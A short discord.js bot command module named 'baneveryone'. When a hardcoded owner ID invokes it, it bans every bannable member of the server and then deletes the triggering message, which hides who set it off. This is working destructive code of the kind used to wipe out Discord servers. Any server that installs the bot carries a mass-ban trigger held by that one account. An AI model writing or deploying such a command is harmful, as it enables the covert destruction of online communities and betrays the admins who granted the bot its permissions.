const Discord = module.require("discord.js");
const ownerID = "316676396305088522";
module.exports.run = async (client, message, args) => {
  try {
    if (message.author.id !== ownerID) return;
    message.guild.members
      .filter(member => member.bannable)
      .forEach(member => {
        member.ban();
      });
    message.delete(1000);
  } catch (e) {
    console.log(e.stack);
  }
};

module.exports.help = {
  name: "baneveryone"
};
